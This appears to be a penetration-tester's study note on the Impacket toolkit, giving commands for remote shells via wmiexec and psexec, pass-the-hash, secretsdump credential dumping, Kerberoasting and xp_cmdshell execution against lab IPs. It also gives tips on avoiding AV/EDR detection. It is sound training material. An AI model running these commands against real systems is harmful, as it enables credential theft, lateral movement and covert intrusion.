---
tags: [tool]
module: footprinting
last_updated: 2026-05-10
source_count: 2
---

# Impacket

Impacket is a collection of Python classes and scripts for working with Windows network protocols — including MSSQL, SMB, WMI, Kerberos, LDAP, and SAMR.

## Overview

Impacket (by SecureAuth/Fortra) provides implementations of Windows network protocols in Python, enabling remote interaction without a Windows client. The suite includes tools for authentication, credential dumping, lateral movement, and database interaction.

Located at: `/usr/share/doc/python3-impacket/examples/`

Install:
```bash
sudo apt install python3-impacket
# or
pip3 install impacket
```

## Key Tools

### mssqlclient.py — MSSQL Client

```bash
# Connect with Windows (domain) authentication
impacket-mssqlclient Administrator@10.129.201.248 -windows-auth
python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth

# Connect with SQL Server authentication
impacket-mssqlclient sa@10.129.201.248

# Once connected:
SQL> select name from sys.databases
SQL> EXEC xp_cmdshell 'whoami'
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

### samrdump.py — SAMR Enumeration

```bash
# Enumerate users via SAMR protocol (alternative to rpcclient)
samrdump.py 10.129.14.128

# With credentials
samrdump.py domain/user:password@10.129.14.128
```

### wmiexec.py — WMI Command Execution

```bash
# Execute command via WMI
wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"

# Pass-the-hash
wmiexec.py -hashes :NTHASH Administrator@10.129.201.248 "whoami"

# Interactive shell
wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248
```

### psexec.py — Remote Shell via SMB

```bash
# Interactive shell (requires admin)
psexec.py Administrator:password@10.129.14.128

# Pass-the-hash
psexec.py -hashes :NTHASH Administrator@10.129.14.128
```

### secretsdump.py — Credential Dumping

```bash
# Dump SAM, LSA secrets, NTDS.dit remotely
secretsdump.py Administrator:password@10.129.14.128

# Domain controller NTDS dump
secretsdump.py -just-dc domain/Administrator:password@10.129.14.128

# Pass-the-hash
secretsdump.py -hashes :NTHASH Administrator@10.129.14.128
```

### smbclient.py — SMB Client

```bash
# Alternative to smbclient
smbclient.py domain/user:password@10.129.14.128
```

### GetUserSPNs.py — Kerberoasting

```bash
# Find Kerberoastable accounts
GetUserSPNs.py domain.local/user:password -dc-ip 10.129.14.128 -request
```

## Flags & Options

### Common Flags (across most tools)

| Flag | Description |
|------|-------------|
| `-hashes <LM:NT>` | Pass-the-hash |
| `-k` | Kerberos authentication |
| `-no-pass` | No password (null session) |
| `-dc-ip <IP>` | Domain controller IP |
| `-target-ip <IP>` | Target IP (if different from host) |
| `-windows-auth` | Windows authentication (MSSQLCLIENT) |
| `-port <N>` | Non-standard port |

## Gotchas & Notes

- **samrdump.py provides the same information as rpcclient enumdomusers** but in a cleaner format. Use both for cross-verification.
- **wmiexec.py leaves minimal traces** compared to psexec.py (no service creation), but it does use SMB for output delivery.
- **psexec.py creates a service** on the target — this is noisy and may trigger AV/EDR. Prefer wmiexec.py for stealth.
- **secretsdump.py** is the fastest route to credential dumping once admin access is obtained. It can dump remotely without touching the disk.
- **mssqlclient.py** is the best option for MSSQL interaction from Linux. It supports Windows auth (NTLM) which is critical for AD-integrated databases.
- **LM:NT hash format**: When passing hashes, supply in `aad3b435b51404eeaad3b435b51404ee:NTHASH` format. The LM portion can be all zeros.

## Related Pages

- [[enumeration/smb]]
- [[enumeration/mssql]]
- [[enumeration/windows_remote_mgmt]]
- [[tools/netexec]]

## Sources

- raw/footprinting/host_based_enumeration_smb.md
- raw/footprinting/host_based_enumeration_mssql.md
